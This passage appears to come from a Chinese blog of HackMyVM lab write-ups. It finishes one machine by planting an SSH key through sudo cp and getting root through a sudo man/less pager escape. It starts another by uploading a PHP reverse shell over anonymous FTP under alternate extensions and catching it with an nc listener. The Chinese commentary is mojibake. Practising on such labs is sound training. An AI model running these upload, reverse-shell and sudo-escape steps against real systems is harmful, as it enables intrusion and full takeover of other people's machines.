<p>è¿™é‡Œå› ä¸ºid_rsaæ˜¯melisaçš„ï¼Œwwwç”¨æˆ·æƒé™ä¸è¶³<br>è§£å†³æ–¹æ³•æ˜¯æˆ‘ä»¬è‡ªå·±åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æœ‰æƒé™äº†ï¼Œç„¶åç”¨sudoæŠŠå†…å®¹ä¹Ÿå¤åˆ¶è¿‡æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line">/bin/cp: cannot create regular file <span class="string">&#x27;/tmp/id&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ ssh-keygen -y -f <span class="built_in">id</span> &gt; authorized_keys</span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/authorized_keys /home/melisa/.ssh</span><br></pre></td></tr></table></figure></div>

<p>æˆåŠŸç”Ÿæˆç§é’¥ï¼Œå¹¶ä¸”æ”¾åˆ°ç”¨æˆ·çš„.sshç›®å½•ä¸‹é¢äº†</p>
<p>æˆåŠŸç™»å½•äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/tmp$ ssh melisa@<span class="number">127.0.0.1</span> -p <span class="number">4444</span> -i id</span><br><span class="line"><span class="attribute">Could</span> not create directory &#x27;/var/www/.ssh&#x27;.</span><br><span class="line"><span class="attribute">The</span> authenticity of host &#x27;[<span class="number">127.0.0.1</span>]:<span class="number">4444</span> ([<span class="number">127.0.0.1</span>]:<span class="number">4444</span>)&#x27; can&#x27;t be established.</span><br><span class="line"><span class="attribute">ECDSA</span> key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span><br><span class="line"><span class="attribute">Are</span> you sure you want to continue connecting (yes/no)? yes</span><br><span class="line"><span class="attribute">Failed</span> to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span><br><span class="line"><span class="attribute">Linux</span> five <span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4</span>.<span class="number">19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line"><span class="attribute">The</span> programs included with the Debian GNU/Linux system are free software;</span><br><span class="line"><span class="attribute">the</span> exact distribution terms for each program are described in the</span><br><span class="line"><span class="attribute">individual</span> files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line"><span class="attribute">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line"><span class="attribute">permitted</span> by applicable law.</span><br><span class="line"><span class="attribute">Last</span> login: Tue Oct  <span class="number">6</span> <span class="number">03</span>:<span class="number">39</span>:<span class="number">32</span> <span class="number">2020</span> from <span class="number">192.168.1.58</span></span><br><span class="line"><span class="attribute">melisa</span>@five:~$ </span><br></pre></td></tr></table></figure></div>
<h2 id="melisa"><a href="#melisa" class="headerlink" title="melisa"></a>melisa</h2><p>æœ‰sudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> melisa on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> melisa may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (<span class="variable constant_">ALL</span>) <span class="variable constant_">SETENV</span>: <span class="variable constant_">NOPASSWD</span>: <span class="regexp">/bin/pwd</span>, <span class="regexp">/bin/arch</span>, <span class="regexp">/bin/man</span>, <span class="regexp">/bin/id</span>, <span class="regexp">/bin/rm</span>, <span class="regexp">/bin/clear</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°manææƒçš„æ–¹å¼<br><img src="https://pic1.imgdb.cn/item/67b4047ed0e0a243d400658a.png"><br>ä½†æ˜¯æŠ¥é”™äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">melisa@five:~$ sudo man man</span><br><span class="line">Your terminal lacks the ability to <span class="keyword">clear</span> the screen or position the cursor.</span><br><span class="line"></span><br><span class="line">man: command exited with status <span class="number">1</span>: sed -e <span class="string">&#x27;/^[[:space:]]*$/&#123; N; /^[[:space:]]*\n[[:space:]]*$/D; &#125;&#x27;</span> | LESS=-ix8RmPm Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$PM Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$ MAN_PN=man(<span class="number">1</span>) pager</span><br></pre></td></tr></table></figure></div>
<p>çœ‹äº†wpï¼ŒåŸæ¥æ˜¯åˆ†é¡µçš„æ¨¡å¼ä¸åŒï¼Œè¦ç”¨lessåˆ†é¡µæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /bin/man -P /usr/bin/less man</span><br><span class="line"><span class="variable constant_">WARNING</span>: terminal is <span class="keyword">not</span> fully functional</span><br><span class="line">-  (press <span class="variable constant_">RETURN</span>)!<span class="regexp">//bbiinn</span><span class="regexp">//bbaasshh</span>!<span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçš„æ„æ€å°±ç›¸å½“äºç”¨lessä½œä¸ºåˆ†é¡µå™¨æ¥çœ‹mançš„æ“ä½œæ‰‹å†Œ ã€‚ -Pç”¨äºæŒ‡å®šåˆ†é¡µå™¨</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å­¦ä¹ åˆ°äº†å¦‚æœä¸Šä¼ çš„æ–‡ä»¶æ‰€åœ¨ç›®å½•æ²¡æœ‰è®¿é—®æƒé™çš„æ—¶å€™è§£å†³æ–¹æ¡ˆ-&gt;ä¸Šä¼ åˆ°æ ¹ç›®å½•<br>ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥  ä»¥åŠæœ‰cpæƒé™æ—¶å€™çš„æ³¨æ„äº‹é¡¹ï¼ˆè‡ªå·±å¯ä»¥å…ˆåˆ›å»ºæœ‰ä¸€ä¸ªæƒé™çš„æ–‡ä»¶ï¼‰<br>sshæ— æ³•ç™»å½•çš„åŸå› ä¹‹ä¸€ï¼šç«¯å£æœªå¼€æ”¾ æˆ–è€… æ²¡æœ‰å¯¹åº”çš„å…¬é’¥<br>manææƒçš„æ—¶å€™é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥æŒ‡å®šåˆ†é¡µå™¨</p>
<p>å†å¤ä¹ ä¸€ä¸‹ ç§é’¥æƒé™æ˜¯600 å…¬é’¥æƒé™æ˜¯644<br>è¿˜æ˜¯æ”¶è·ä¸å°‘çš„</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Forbidden</title>
    <url>/posts/26924.html</url>
    <content><![CDATA[<p>HMV-Forbiddené¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nmap -A <span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>     </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) <span class="built_in">at</span> <span class="number">2025</span><span class="number">-03</span><span class="number">-02</span> <span class="number">13</span>:<span class="number">56</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line">Host is up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span><span class="number">.3</span></span><br><span class="line">| <span class="type">ftp</span>-syst: </span><br><span class="line">|   <span class="type">STAT</span>: </span><br><span class="line">| <span class="type">FTP</span> server status:</span><br><span class="line">|      <span class="type">Connected</span> to ::ffff:<span class="number">192.168</span><span class="number">.58</span><span class="number">.11</span></span><br><span class="line">|      <span class="type">Logged</span> <span class="built_in">in</span> <span class="built_in">as</span> ftp</span><br><span class="line">|      <span class="type">TYPE</span>: ASCII</span><br><span class="line">|      <span class="type">No</span> session bandwidth limit</span><br><span class="line">|      <span class="type">Session</span> <span class="built_in">timeout</span> <span class="built_in">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      <span class="type">Control</span> connection is plain text</span><br><span class="line">|      <span class="type">Data</span> connections will be plain text</span><br><span class="line">|      <span class="type">At</span> session startup, client count was <span class="number">3</span></span><br><span class="line">|      <span class="type">vsFTPd</span> <span class="number">3.0</span><span class="number">.3</span> - secure, fast, stable</span><br><span class="line">|<span class="type">_End</span> of status</span><br><span class="line">| <span class="type">ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|<span class="type">_drwxrwxrwx</span>    <span class="number">2</span> <span class="number">0</span>        <span class="number">0</span>            <span class="number">4096</span> Oct <span class="number">09</span>  <span class="number">2020</span> www [NSE: writeable]</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">|<span class="type">_http</span>-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|<span class="type">_http</span>-server-header: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">MAC Address: <span class="number">6</span>E:<span class="number">0</span>B:<span class="number">06</span>:<span class="number">76</span>:<span class="number">34</span>:C6 (Unknown)</span><br><span class="line">Device type: general purpose|<span class="type">router</span></span><br><span class="line">Running: Linux <span class="number">4.</span>X|<span class="type">5</span>.X, MikroTik RouterOS <span class="number">7.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">4</span> cpe:/o:linux:linux_kernel:<span class="number">5</span> cpe:/o:mikrotik:routeros:<span class="number">7</span> cpe:/o:linux:linux_kernel:<span class="number">5.6</span><span class="number">.3</span></span><br><span class="line">OS details: Linux <span class="number">4.15</span> - <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> - <span class="number">7.5</span> (Linux <span class="number">5.6</span><span class="number">.3</span>)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.66</span> ms bogon (<span class="number">192.168</span><span class="number">.58</span><span class="number">.239</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">8.84</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾21å’Œ80ï¼Œå…ˆå»ftpè¿™é‡Œçœ‹çœ‹èƒ½ä¸èƒ½åŒ¿åç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 .</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Oct 09  2020 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html</span><br><span class="line">-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt</span><br><span class="line">-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat note.txt</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get note.txt</span><br><span class="line">local: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||39793|)</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (75 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|    75       14.41 KiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">75 bytes received in 00:00 (8.37 KiB/s)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">ftp&gt; get robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">local: robots.txt remote: robots.txt</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">229 Entering Extended Passive Mode (|||36280|)</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">150 Opening BINARY mode data connection for robots.txt (10 bytes).</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">100% |*</span>**</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    10        6.60 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">10 bytes received in 00:00 (2.20 KiB/s)</span><br></pre></td></tr></table></figure></div>
<p>ç™»å½•ä¸Šå»ä¹‹åå‘ç°wwwç›®å½•ä¸‹é¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥getæ‹¿åˆ°æœ¬åœ°æ¥ï¼Œè¿™é‡Œåº”è¯¥ç”¨ç›®å½•æ‰«æä¹Ÿèƒ½å¾—åˆ°è¿™å‡ ä¸ªæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat note.txt      </span></span><br><span class="line">The extra-secured .jpg <span class="built_in">file</span> <span class="keyword">contains</span> <span class="keyword">my</span> password <span class="keyword">but</span> nobody can obtain <span class="keyword">it</span>.</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat robots.txt </span></span><br><span class="line">/note.txt</span><br></pre></td></tr></table></figure></div>


<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">SECURE WEB/FTP</span><br><span class="line">Hi, Im the best admin of the world. You cannot<span class="built_in"> execute </span>.php code on this server so you cannot obtain a reverse shell. Not sure<span class="built_in"> if </span>its misconfigured another things... but the importart is that php is disabled. -marta</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¸€ç›´åœ¨å¼ºè°ƒphpè¢«banä¸èƒ½åå¼¹shell  ç„¶åè¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åmarta<br>é‚£ç°åœ¨å°±æ˜¯ç›®å½•æ‰«æwebæœåŠ¡ï¼Œç„¶åæ‰¾åˆ°æ‰©å±•åæ˜¯.jpgçš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">â””â”€# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.239  -x jpg,php,txt,js</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,js,jpg</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/robots.txt           (Status: 200) [Size: 10]</span><br><span class="line">/note.txt             (Status: 200) [Size: 75]</span><br><span class="line"><span class="section">Progress: 1038215 / 1038220 (100.00%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure></div>
<p>æ‰«æç»“æœæ²¡æœ‰æ˜¾ç¤ºå¤šä½™çš„ä¿¡æ¯ï¼Œé‚£ç°åœ¨çš„ç›®æ ‡åªèƒ½æ”¾åœ¨ftpä¸Šäº†ï¼Œå› ä¸ºwebè¿™é‡Œå·²ç»æ²¡æœ‰å¤šä½™çš„ä¿¡æ¯ã€‚<br>åˆšæ‰åˆ©ç”¨ftpä¸‹è½½æ–‡ä»¶ï¼Œç°åœ¨æˆ‘ä»¬ä¹Ÿèƒ½åˆ©ç”¨ftpä¸Šä¼ æ–‡ä»¶ï¼Œå› ä¸ºftpåŒ¿åè®¿é—®çš„å°±æ˜¯wwwç›®å½•ï¼Œé‡Œé¢çš„note.txtå°±æ˜¯webå¯ä»¥è®¿é—®åˆ°çš„è·¯å¾„<br>ä½†æ˜¯è¿™é‡Œä¸€ç›´è¯´phpä¸èƒ½æ‰§è¡Œï¼Œæˆ‘ä»¬çŸ¥é“phpè¿˜æœ‰å¾ˆå¤šæ‰©å±•åï¼Œæˆ‘ä»¬éƒ½è¯•è¯•   php3ï¼Œphp5ï¼Œphtï¼Œphtmlï¼Œphps éƒ½æ˜¯ php å¯è¿è¡Œçš„æ–‡ä»¶æ‰©å±•å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cp php-reverse-shell.php shell.php3</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cp php-reverse-shell.php shell.php5</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cp php-reverse-shell.php shell.phps</span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cp php-reverse-shell.php shell.pht </span><br><span class="line"><span class="code">                                                                                                                                                        </span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp anonymous@192.168.58.239</span><br><span class="line">Connected to 192.168.58.239.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||5545|)</span><br><span class="line">553 Could not create file.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||36869|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 0        0            4096 Oct 09  2020 www</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd www</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put shell.php3</span><br><span class="line">local: shell.php3 remote: shell.php3</span><br><span class="line">229 Entering Extended Passive Mode (|||15003|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       30.83 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (557.10 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.php5</span></span><br><span class="line"><span class="strong">local: shell.php5 remote: shell.php5</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||57590|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       30.65 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (930.02 KiB/s)</span><br><span class="line">ftp&gt; put shell.phps</span><br><span class="line">local: shell.phps remote: shell.phps</span><br><span class="line">229 Entering Extended Passive Mode (|||50303|)</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">**|  5496       11.77 MiB/s    00:00 ETA</span></span><br><span class="line"><span class="strong">226 Transfer complete.</span></span><br><span class="line"><span class="strong">5496 bytes sent in 00:00 (857.65 KiB/s)</span></span><br><span class="line"><span class="strong">ftp&gt; put shell.pht</span></span><br><span class="line"><span class="strong">local: shell.pht remote: shell.pht</span></span><br><span class="line"><span class="strong">229 Entering Extended Passive Mode (|||34415|)</span></span><br><span class="line"><span class="strong">150 Ok to send data.</span></span><br><span class="line"><span class="strong">100% |**</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>|  5496       25.44 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">5496 bytes sent in 00:00 (838.49 KiB/s)</span><br></pre></td></tr></table></figure></div>
<p>æŠŠåå¼¹shellçš„phpæ–‡ä»¶æ›´æ”¹åç¼€åä¹‹åéƒ½ä¸Šä¼ åˆ°wwwç›®å½•ä¸‹é¢<br>å°è¯•ä¹‹åå‘ç°php5å¯ä»¥ï¼Œï¼ˆè¿™é‡Œæˆ‘ç¬¬ä¸€æ¬¡æŠŠphpä¸­çš„ipå†™é”™äº†ï¼Œæ‰€ä»¥æ”¹äº†ä¸€ä¸‹åç§°ï¼‰ æˆåŠŸæ‹¿åˆ°äº†webshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234            </span><br><span class="line">Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="line"> 03:22:44 up 31 min,  0 users,  load average: 0.35, 0.18, 0.27<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="string">â””â”€# curl 192.168.58.239/shell1.php5 </span></span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>wwwç”¨æˆ·æ²¡æœ‰sudoæƒé™<br>ç„¶åæ ¹æ®ä¸Šé¢webçš„æç¤ºï¼Œè¦æ‰¾åˆ°jpgæ–‡ä»¶<br>æ‰¾åˆ°äº†ä¹‹åå‘ç°æœ‰python3 ç›´æ¥ç”¨python3å¼€å¯httpæœåŠ¡ï¼Œæœ¬æœºä¸Šwgetä¸‹è½½è¿™ä¸ªå›¾ç‰‡</p>
